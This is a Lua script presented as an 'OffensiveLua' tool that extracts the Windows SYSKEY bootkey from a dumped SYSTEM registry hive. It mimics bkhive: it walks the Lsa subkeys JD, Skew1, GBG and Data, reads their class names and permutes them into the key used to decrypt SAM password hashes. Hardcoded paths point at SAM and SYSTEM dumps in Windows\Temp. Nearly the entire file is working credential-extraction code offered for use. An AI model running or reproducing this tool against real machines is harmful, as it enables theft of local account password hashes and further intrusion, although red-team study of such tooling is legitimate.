-- Configuration for testing with existing bin files
local CONFIG_USE_EXISTING_BINS = true  -- Set to true to use existing bin files for testing
local CONFIG_SAM_BIN_PATH = "c:\\Windows\\Temp\\WIN11LAB_samdump_20251017_142525_sam.bin"
local CONFIG_SYSTEM_BIN_PATH = "c:\\Windows\\Temp\\WIN11LAB_samdump_20251017_142525_system.bin"

-- Simplified SAM dumper that mimics bkhive exactly
local ffi = require("ffi")
local bit = require("bit")

-- Load libraries
local kernel32 = ffi.load("kernel32")
local netapi32 = ffi.load("netapi32")

-- Simple logging
local function log(message)
    print("[LOG] " .. message)
end

local function debug_log(message)
    print("[DEBUG] " .. message)
end

local function error_log(message)
    print("[ERROR] " .. message)
end

-- Utility functions
local function read_le16(data, offset)
    if offset + 2 > #data then return nil end
    local a, b = string.byte(data, offset + 1, offset + 2)
    return a + (b * 256)
end

local function read_le32(data, offset)
    if offset + 4 > #data then return nil end
    local a, b, c, d = string.byte(data, offset + 1, offset + 4)
    return a + (b * 256) + (c * 65536) + (d * 16777216)
end

-- Parse NK record (like bkhive read_nk)
local function parse_nk_record(hive_data, offset)
    if offset + 76 > #hive_data then
        return nil
    end
    
    local signature = string.sub(hive_data, offset + 1, offset + 2)
    if signature ~= "nk" then
        return nil
    end
    
    local nk = {}
    nk.flags = read_le16(hive_data, offset + 2)
    nk.parent_key_offset = read_le32(hive_data, offset + 16)
    nk.subkeys_count = read_le32(hive_data, offset + 20)
    nk.subkeys_list_offset = read_le32(hive_data, offset + 28)
    nk.values_count = read_le32(hive_data, offset + 36)
    nk.values_list_offset = read_le32(hive_data, offset + 40)
    nk.class_name_offset = read_le32(hive_data, offset + 48)
    nk.key_name_length = read_le16(hive_data, offset + 72)
    nk.class_name_length = read_le16(hive_data, offset + 74)
    
    -- Read key name
    if nk.key_name_length > 0 and offset + 76 + nk.key_name_length <= #hive_data then
        nk.key_name = string.sub(hive_data, offset + 76 + 1, offset + 76 + nk.key_name_length)
    end
    
    return nk
end

-- Find subkey by name (like bkhive parself)
local function find_subkey_by_name(hive_data, list_offset, target_name)
    if not list_offset or list_offset == 0 then
        return nil
    end
    
    -- Add 0x1000 to offset (like bkhive)
    local abs_offset = list_offset + 0x1000
    
    if abs_offset + 8 > #hive_data then
        return nil
    end
    
    local signature = string.sub(hive_data, abs_offset + 1, abs_offset + 2)
    if signature ~= "lf" and signature ~= "lh" and signature ~= "li" then
        debug_log(string.format("Invalid subkey list signature: %s at offset 0x%x", signature, abs_offset))
        return nil
    end
    
    local elements_count = read_le16(hive_data, abs_offset + 2)
    if not elements_count or elements_count == 0 then
        return nil
    end
    
    debug_log(string.format("Searching %d subkeys for '%s'", elements_count, target_name))
    
    -- Each element is 8 bytes (4 bytes offset + 4 bytes hash/name)
    for i = 0, elements_count - 1 do
        local element_offset = abs_offset + 4 + (i * 8)
        if element_offset + 8 <= #hive_data then
            local subkey_offset = read_le32(hive_data, element_offset)
            if subkey_offset then
                -- Add 0x1000 to subkey offset (like bkhive)
                local subkey_abs_offset = subkey_offset + 0x1000
                
                local nk_record = parse_nk_record(hive_data, subkey_abs_offset)
                if nk_record and nk_record.key_name then
                    debug_log(string.format("  Found subkey: %s", nk_record.key_name))
                    if string.lower(nk_record.key_name) == string.lower(target_name) then
                        debug_log(string.format("*** MATCH: %s at offset 0x%x ***", target_name, subkey_abs_offset))
                        return subkey_abs_offset
                    end
                end
            end
        end
    end
    
    return nil
end

-- Read registry value from hive
local function read_registry_value(hive_data, nk_offset, value_name)
    local nk_record = parse_nk_record(hive_data, nk_offset)
    if not nk_record or nk_record.values_count == 0 or nk_record.values_list_offset == 0 then
        return nil
    end
    
    local values_list_offset = nk_record.values_list_offset + 0x1000
    if values_list_offset + (nk_record.values_count * 4) > #hive_data then
        return nil
    end
    
    -- Iterate through value list
    for i = 0, nk_record.values_count - 1 do
        local value_offset_ptr = values_list_offset + (i * 4)
        local value_offset = read_le32(hive_data, value_offset_ptr)
        if value_offset then
            local value_abs_offset = value_offset + 0x1000
            if value_abs_offset + 20 <= #hive_data then
                local vk_signature = string.sub(hive_data, value_abs_offset + 1, value_abs_offset + 2)
                if vk_signature == "vk" then
                    local name_length = read_le16(hive_data, value_abs_offset + 2)
                    local data_length = read_le32(hive_data, value_abs_offset + 4)
                    local data_offset = read_le32(hive_data, value_abs_offset + 8)
                    
                    -- Read value name
                    local vk_name = ""
                    if name_length > 0 and value_abs_offset + 20 + name_length <= #hive_data then
                        vk_name = string.sub(hive_data, value_abs_offset + 20 + 1, value_abs_offset + 20 + name_length)
                    end
                    
                    -- Check if this is the value we want
                    if string.lower(vk_name) == string.lower(value_name) then
                        -- Extract value data
                        local actual_length = bit.band(data_length, 0x0000FFFF)
                        if actual_length < 5 then
                            -- Data is stored in the offset field itself
                            return string.sub(ffi.string(ffi.new("uint32_t[1]", data_offset), 4), 1, actual_length)
                        else
                            -- Data is stored at the offset
                            local data_abs_offset = data_offset + 0x1000
                            if data_abs_offset + actual_length <= #hive_data then
                                return string.sub(hive_data, data_abs_offset + 1, data_abs_offset + actual_length)
                            end
                        end
                    end
                end
            end
        end
    end
    
    return nil
end

-- BKHIVE-style bootkey extraction
local function extract_bootkey_bkhive_style(hive_data)
    debug_log("=== BKHIVE-STYLE BOOTKEY EXTRACTION ===")
    debug_log(string.format("SYSTEM hive size: %d bytes", #hive_data))
    
    -- STEP 1: Get root key at fixed offset 0x1020 (like bkhive)
    local root_offset = 0x1020
    debug_log(string.format("Reading root key at fixed offset: 0x%x", root_offset))
    
    local root_nk = parse_nk_record(hive_data, root_offset)
    if not root_nk or not root_nk.key_name then
        debug_log("Failed to parse root NK record at 0x1020")
        
        -- Let's check what's actually at 0x1020
        if root_offset + 4 <= #hive_data then
            local sig_at_1020 = string.sub(hive_data, root_offset + 1, root_offset + 4)
            debug_log(string.format("Signature at 0x1020: %s", sig_at_1020))
        end
        
        -- Try some other common root offsets
        local common_offsets = { 0x1024, 0x20, 0x1000 + 0x20, 0x1000 + 0x24 }
        for _, test_offset in ipairs(common_offsets) do
            debug_log(string.format("Trying root offset: 0x%x", test_offset))
            if test_offset + 76 <= #hive_data then
                local sig = string.sub(hive_data, test_offset + 1, test_offset + 2)
                debug_log(string.format("  Signature: %s", sig))
                if sig == "nk" then
                    local test_nk = parse_nk_record(hive_data, test_offset)
                    if test_nk and test_nk.key_name then
                        debug_log(string.format("  Found valid NK: %s (subkeys: %d)", test_nk.key_name, test_nk.subkeys_count or 0))
                        root_offset = test_offset
                        root_nk = test_nk
                        break
                    end
                end
            end
        end
        
        if not root_nk or not root_nk.key_name then
            debug_log("Could not find root NK record at any common offset")
            return nil
        end
    end
    
    debug_log(string.format("Root key name: %s", root_nk.key_name))
    debug_log(string.format("Root subkeys: %d", root_nk.subkeys_count or 0))
    
    -- STEP 2: Navigate to Select\Default to get active ControlSet number
    debug_log("Looking for Select subkey...")
    local select_offset = find_subkey_by_name(hive_data, root_nk.subkeys_list_offset, "Select")
    if not select_offset then
        debug_log("Select key not found under root")
        return nil
    end
    
    debug_log(string.format("Found Select key at offset: 0x%x", select_offset))
    
    -- Get Default value from Select key to determine active ControlSet
    local default_value = read_registry_value(hive_data, select_offset, "Default")
    local control_set_num = 1  -- default fallback
    
    if default_value and #default_value == 4 then
        control_set_num = read_le32(default_value, 0) or 1
        debug_log(string.format("Active ControlSet from Default value: %03d", control_set_num))
    else
        debug_log("Using default ControlSet: 001")
    end
    
    -- STEP 3: Navigate to ControlSetXXX\Control\Lsa
    local controlset_name = string.format("ControlSet%03d", control_set_num)
    debug_log(string.format("Looking for %s...", controlset_name))
    
    local controlset_offset = find_subkey_by_name(hive_data, root_nk.subkeys_list_offset, controlset_name)
    if not controlset_offset then
        debug_log(string.format("%s key not found under root", controlset_name))
        return nil
    end
    
    debug_log(string.format("Found %s at offset: 0x%x", controlset_name, controlset_offset))
    
    -- Parse ControlSet key
    local controlset_nk = parse_nk_record(hive_data, controlset_offset)
    if not controlset_nk then
        debug_log("Failed to parse ControlSet NK record")
        return nil
    end
    
    -- Find Control under ControlSet
    debug_log("Looking for Control subkey...")
    local control_offset = find_subkey_by_name(hive_data, controlset_nk.subkeys_list_offset, "Control")
    if not control_offset then
        debug_log("Control key not found under ControlSet")
        return nil
    end
    
    debug_log(string.format("Found Control at offset: 0x%x", control_offset))
    
    -- Parse Control key
    local control_nk = parse_nk_record(hive_data, control_offset)
    if not control_nk then
        debug_log("Failed to parse Control NK record")
        return nil
    end
    
    -- Find Lsa under Control
    debug_log("Looking for Lsa subkey...")
    local lsa_offset = find_subkey_by_name(hive_data, control_nk.subkeys_list_offset, "Lsa")
    if not lsa_offset then
        debug_log("Lsa key not found under Control")
        return nil
    end
    
    debug_log(string.format("Found Lsa at offset: 0x%x", lsa_offset))
    
    -- STEP 4: Extract class names from JD, Skew1, GBG, Data keys (like bkhive)
    local lsa_nk = parse_nk_record(hive_data, lsa_offset)
    if not lsa_nk then
        debug_log("Failed to parse Lsa NK record")
        return nil
    end
    
    local bootkey_components = { "JD", "Skew1", "GBG", "Data" }
    local class_values = {}
    
    for i, key_name in ipairs(bootkey_components) do
        debug_log(string.format("Looking for bootkey component: %s", key_name))
        local key_offset = find_subkey_by_name(hive_data, lsa_nk.subkeys_list_offset, key_name)
        
        if not key_offset then
            debug_log(string.format("Bootkey component %s not found", key_name))
            return nil
        end
        
        local key_nk = parse_nk_record(hive_data, key_offset)
        if not key_nk or not key_nk.class_name_offset or key_nk.class_name_offset == 0 then
            debug_log(string.format("No class name for %s", key_name))
            return nil
        end
        
        -- Read class name (like bkhive: classname_off + 0x1000)
        local class_offset = key_nk.class_name_offset + 0x1000
        local class_length = key_nk.class_name_length or 8
        
        if class_offset + class_length <= #hive_data then
            local class_data = string.sub(hive_data, class_offset + 1, class_offset + class_length)
            
            -- Convert unicode to ascii (like bkhive quick hack)
            local ascii_class = ""
            for j = 1, class_length, 2 do
                if j <= #class_data then
                    ascii_class = ascii_class .. string.sub(class_data, j, j)
                end
            end
            
            class_values[i] = ascii_class
            debug_log(string.format("Bootkey component %s: %s", key_name, ascii_class))
        else
            debug_log(string.format("Class offset out of bounds for %s", key_name))
            return nil
        end
    end
    
    -- STEP 5: Combine and permute like bkhive
    local combined = table.concat(class_values)
    debug_log("Combined bootkey string: " .. combined)
    
    -- Convert hex string to bytes
    local key_bytes = {}
    for i = 1, #combined, 2 do
        local hex_pair = string.sub(combined, i, i + 1)
        local byte_val = tonumber(hex_pair, 16)
        if byte_val then
            key_bytes[math.floor((i-1)/2) + 1] = byte_val
        else
            debug_log("Invalid hex in bootkey: " .. hex_pair)
            return nil
        end
    end
    
    -- Apply bkhive permutation (Little Endian)
    local p = { 0xb, 0x6, 0x7, 0x1, 0x8, 0xa, 0xe, 0x0, 0x3, 0x5, 0x2, 0xf, 0xd, 0x9, 0xc, 0x4 }
    local permuted_key = ""
    
    for i = 1, 16 do
        local src_index = p[i] + 1  -- Lua 1-based indexing
        if key_bytes[src_index] then
            permuted_key = permuted_key .. string.char(key_bytes[src_index])
        end
    end
    
    -- Convert to hex string for display
    local bootkey_hex = ""
    for i = 1, #permuted_key do
        bootkey_hex = bootkey_hex .. string.format("%02x", string.byte(permuted_key, i))
    end
    
    debug_log("Real bootkey extracted (bkhive-style): " .. bootkey_hex)
    return permuted_key
end

-- Read file
local function read_hive_file(filename)
    local file = io.open(filename, "rb")
    if not file then
        return nil
    end
    
    local content = file:read("*all")
    file:close()
    
    return content
end

-- Main execution
local function main()
    print("OffensiveLua BKHIVE-Style Bootkey Extractor")
    print("===========================================")
    print("")
    
    -- Read SYSTEM hive
    local system_data = read_hive_file(CONFIG_SYSTEM_BIN_PATH)
    if not system_data then
        error_log("Failed to read SYSTEM hive file: " .. CONFIG_SYSTEM_BIN_PATH)
        return false
    end
    
    log("SYSTEM hive loaded successfully")
    
    -- Extract bootkey
    local bootkey = extract_bootkey_bkhive_style(system_data)
    if not bootkey then
        error_log("Failed to extract bootkey from SYSTEM hive")
        return false
    end
    
    -- Convert to hex string for final display
    local bootkey_hex = ""
    for i = 1, #bootkey do
        bootkey_hex = bootkey_hex .. string.format("%02x", string.byte(bootkey, i))
    end
    
    print("")
    print("SUCCESS!")
    print("Bootkey: " .. bootkey_hex)
    print("")
    
    return true
end

-- Execute
local success, error_msg = pcall(main)
if not success then
    error_log("Script execution failed: " .. tostring(error_msg))
    return false
end

return true